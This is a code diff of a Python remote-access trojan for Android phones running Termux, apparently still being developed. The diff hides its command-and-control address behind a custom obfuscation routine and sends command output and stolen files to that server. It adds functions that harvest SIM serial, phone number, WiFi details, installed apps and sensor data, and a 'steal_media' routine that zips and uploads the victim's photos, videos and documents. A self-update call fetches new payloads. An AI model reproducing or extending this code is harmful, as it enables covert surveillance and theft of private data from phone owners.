@@ -1,8 +1,38 @@
 import sys, os, subprocess, requests, time, platform, json
 
-# --- Configuration ---
-C2_URL = "http://YOUR_C2_SERVER_IP:8080"
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
+# --- Configuration (OPSEC: Advanced Obfuscated C2 URL) ---
+def _xd(d, s="k3ycu5t0m", r=4):
+    import hashlib
+    if not d or len(d) < 2: return ""
+    SB = [0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16]
+    IS = [0]*256; [IS.__setitem__(v, i) for i, v in enumerate(SB)]
+    sd = s.encode(); ks = []
+    for _ in range(r): sd = hashlib.sha256(sd).digest(); ks.append(sd)
+    raw = list(d); pc = [ks[-1][0]]
+    for i in range(len(raw)):
+        cur = raw[i]; raw[i] = (raw[i] - ks[2][i % len(ks[2])]) & 0xFF
+        raw[i] ^= pc[-1]; pc.append(cur)
+    m = len(raw) // 2; left, right = raw[:m], raw[m:]
+    for rd in range(r - 1, -1, -1):
+        rk = ks[rd % len(ks)]
+        mx = [SB[(b ^ rk[i % len(rk)]) & 0xFF] for i, b in enumerate(left)]
+        right = [b ^ x for b, x in zip(right, mx)]; left, right = right, left
+    raw = left + right; n = len(raw); rs = int.from_bytes(ks[1][:8], 'big'); sw = []
+    for i in range(n - 1, 0, -1):
+        rs = (rs * 6364136223846793005 + 1442695040888963407) & 0xFFFFFFFFFFFFFFFF
+        sw.append((i, rs % (i + 1)))
+    for i, j in reversed(sw): raw[i], raw[j] = raw[j], raw[i]
+    for i in range(len(raw)):
+        k = ks[0][i % len(ks[0])]
+        rt = (i + k) % 8; raw[i] = ((raw[i] >> rt) | (raw[i] << (8 - rt))) & 0xFF
+        raw[i] = IS[(raw[i] ^ k) & 0xFF]
+    ol = (raw[-2] << 8) | raw[-1]
+    return bytes(raw[:ol]).decode()
+
+# Obfuscated C2 endpoint (XOR encrypted)
+# Use obfuscator.py to generate your own encoded bytes
+_C2_ENC = bytes([0x00]) # PASTE_YOUR_BYTES_HERE # PASTE_YOUR_BYTES_HERE
+C2_URL = _xd(_C2_ENC)
 HEARTBEAT_INTERVAL = 5
 
 # --- Runtime Detection ---
@@ -46,37 +76,23 @@ class StatefulShell:
 
 # --- Helper Functions ---
 def post_output(client_id, cmd_id, command_line, output):
+    # OPSEC: All output goes through C2 webhook proxy
     try:
-        short_out = (output[:500] + "...") if len(output) > 500 else output
-        requests.post(f"{C2_URL}/report/{client_id}", json={'cmd_id': cmd_id, 'output': short_out}, timeout=10)
-    except: pass
-    try:
-        header = f"**[Result]** `{client_id[:8]}` (CMD: `{command_line}`)\n"
-        if len(output) > 1900:
-            temp_path = os.path.join(TEMP_DIR, f"res_{cmd_id}.txt")
-            with open(temp_path, "w", encoding="utf-8") as f: f.write(output)
-            with open(temp_path, "rb") as f:
-                requests.post(DISCORD_WEBHOOK_URL, data={"content": header}, files={"file": (f"result_{cmd_id}.txt", f.read())})
-            if os.path.exists(temp_path): os.remove(temp_path)
-        else:
-            requests.post(DISCORD_WEBHOOK_URL, json={"content": f"{header}```\n{output}\n```"})
+        requests.post(f"{C2_URL}/report/{client_id}",
+                     json={'cmd_id': cmd_id, 'output': output, 'command': command_line},
+                     timeout=15)
     except: pass
 
 def exfiltrate_file(filepath, client_id=None, message=""):
+    # OPSEC: All files go through C2 webhook proxy
     try:
         if not os.path.exists(filepath) or os.path.getsize(filepath) == 0:
             return f"File exfiltration failed: '{os.path.basename(filepath)}' is missing or empty."
-        file_size = os.path.getsize(filepath)
-        if file_size > 20_000_000 and client_id:
-            with open(filepath, 'rb') as f:
-                requests.post(f"{C2_URL}/loot/{client_id}", files={"file": (os.path.basename(filepath), f.read())}, timeout=60)
-            return f"File exported to C2 exfiltrated folder ({file_size/1e6:.1f}MB)."
         with open(filepath, 'rb') as f:
-            r = requests.post(DISCORD_WEBHOOK_URL, data={"content": message}, files={"file": (os.path.basename(filepath), f.read())})
-            if r.status_code >= 400 and client_id:
-                f.seek(0)
-                requests.post(f"{C2_URL}/loot/{client_id}", files={"file": (os.path.basename(filepath), f.read())}, timeout=60)
-                return f"Discord rejected file. Exported to C2 instead ({file_size/1e6:.1f}MB)."
+            requests.post(f"{C2_URL}/loot/{client_id}",
+                         data={"message": message},
+                         files={"file": (os.path.basename(filepath), f.read())},
+                         timeout=60)
         return ""
     except Exception as e:
         return f"File exfiltration failed: {e}"
@@ -227,6 +243,123 @@ def get_call_log(limit=20):
         return None, "Call log access failed. Grant Phone/Call Log permission to Termux:API."
     return None, "Call log only available via Termux:API."
 
+def get_sim_info():
+    if RUNTIME == "termux":
+        out, ok = _run_termux_cmd(["termux-telephony-deviceinfo"], timeout=10)
+        if ok and out:
+            try:
+                data = json.loads(out)
+                info = (
+                    f"Device ID: {data.get('device_id', 'Unknown')}\n"
+                    f"Network Operator: {data.get('network_operator_name', 'Unknown')}\n"
+                    f"SIM Operator: {data.get('sim_operator_name', 'Unknown')}\n"
+                    f"SIM Serial: {data.get('sim_serial_number', 'Unknown')}\n"
+                    f"Phone Number: {data.get('phone_number', 'Not available from SIM')}"
+                )
+                return info, None
+            except: return out, None
+        return None, "Telephony info access failed. Grant Phone permission to Termux:API."
+    return None, "SIM info only available via Termux:API."
+def get_wifi_info():
+    if RUNTIME == "termux":
+        out, ok = _run_termux_cmd(["termux-wifi-connectioninfo"], timeout=10)
+        if ok and out:
+            try:
+                data = json.loads(out)
+                ssid = data.get("ssid", "Unknown")
+                ip = data.get("ip", "Unknown")
+                mac = data.get("mac_address", "Unknown")
+                speed = data.get("link_speed_mbps", "Unknown")
+                return f"WiFi: {ssid}\nIP: {ip}\nMAC: {mac}\nSpeed: {speed} Mbps", None
+            except: return out, None
+        return None, "WiFi info access failed. Check Location permission (required for WiFi info on Android)."
+    return None, "WiFi info only available via Termux:API."
+
+def get_installed_apps():
+    # Use Android's package manager natively, works on both termux and apk without root
+    try:
+        shell_bin = "/data/data/com.termux/files/usr/bin/sh" if RUNTIME == "termux" else "/system/bin/sh"
+        if not os.path.exists(shell_bin): shell_bin = "/bin/sh"
+        res = subprocess.run([shell_bin, "-c", "pm list packages -3"], capture_output=True, text=True, timeout=15)
+        if res.returncode == 0 and res.stdout:
+            apps = [line.replace("package:", "").strip() for line in res.stdout.strip().split("\n")]
+            return "\n".join(sorted(apps)), None
+    except Exception as e:
+        return None, f"Failed to list apps: {e}"
+    return None, "No third-party apps found or permission denied."
+
+def get_sensor_data():
+    if RUNTIME == "termux":
+        # Get light and proximity (or all if not supported filtering)
+        out, ok = _run_termux_cmd(["termux-sensor", "-s", "Light,Proximity,Accelerometer", "-n", "1"], timeout=10)
+        if ok and out:
+            try:
+                data = json.loads(out)
+                result = []
+                for sensor_name, sensor_data in data.items():
+                    values = sensor_data.get("values", [])
+                    val_str = ", ".join([str(v) for v in values])
+                    result.append(f"{sensor_name}: {val_str}")
+                return "\n".join(result), None
+            except: return out, None
+        return None, "Sensor access failed."
+    return None, "Sensor data only available via Termux:API."
+
+import shutil
+def steal_media(limit_str):
+    if not (os.path.exists("/sdcard/DCIM") or os.path.exists("/sdcard/Download")):
+        return None, "Storage access denied or /sdcard not found. Run 'termux-setup-storage' first."
+        
+    targets = ["/sdcard/DCIM/Camera", "/sdcard/Download", "/sdcard/Pictures"]
+    all_files = []
+    
+    for t in targets:
+        if not os.path.exists(t): continue
+        for root, dirs, files in os.walk(t):
+            for file in files:
+                ext = file.lower().split('.')[-1]
+                if ext in ['jpg', 'jpeg', 'png', 'mp4', 'pdf', 'zip']:
+                    full_path = os.path.join(root, file)
+                    try:
+                        all_files.append((full_path, os.path.getmtime(full_path)))
+                    except: pass
+                    
+    # Sort newest first
+    all_files.sort(key=lambda x: x[1], reverse=True)
+    
+    if limit_str.lower() == "all":
+        # Zip them up
+        zip_path = os.path.join(TEMP_DIR, "media_loot.zip")
+        try:
+            import zipfile
+            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                 # Be careful not to zip the whole phone, limit to 200 files
+                 for filepath, _ in all_files[:200]:
+                     zipf.write(filepath, arcname=os.path.basename(filepath))
+            return zip_path, None
+        except Exception as e:
+             return None, f"Zipping failed: {e}"
+             
+    else:
+        try: limit = int(limit_str)
+        except: limit = 5
+        
+        if not all_files: return None, "No media files found."
+        
+        # We can only return one filepath for exfiltration, so we zip them if there's more than 1
+        if limit == 1:
+            return all_files[0][0], None
+            
+        zip_path = os.path.join(TEMP_DIR, "media_loot.zip")
+        try:
+            import zipfile
+            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                 for filepath, _ in all_files[:limit]:
+                     zipf.write(filepath, arcname=os.path.basename(filepath))
+            return zip_path, None
+        except Exception as e:
+             return None, f"Zipping failed: {e}"
+
 def self_update():
     try:
         r = requests.get(f"{C2_URL}/update", timeout=30)
@@ -330,6 +463,19 @@ def main():
                     elif cmd == "callog":
                         limit = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 20
                         report, err = get_call_log(limit); output = err if err else report
+                    elif cmd == "sim_info":
+                        report, err = get_sim_info(); output = err if err else report
+                    elif cmd == "wifi_info":
+                        report, err = get_wifi_info(); output = err if err else report
+                    elif cmd == "apps":
+                        report, err = get_installed_apps(); output = err if err else report
+                    elif cmd == "sensor":
+                        report, err = get_sensor_data(); output = err if err else report
+                    elif cmd == "steal" and len(parts) >= 2 and parts[1].lower() == "media":
+                        limit_str = parts[2] if len(parts) > 2 else "5"
+                        filepath, err = steal_media(limit_str)
+                        if err: output = err
+                        else: output = exfiltrate_file(filepath, client_id, f"Android Media Loot (`{limit_str}` files) from `{client_id}`")
                     elif cmd == "sys_update":
                         output = self_update() or "Restarting with new payload..."
 
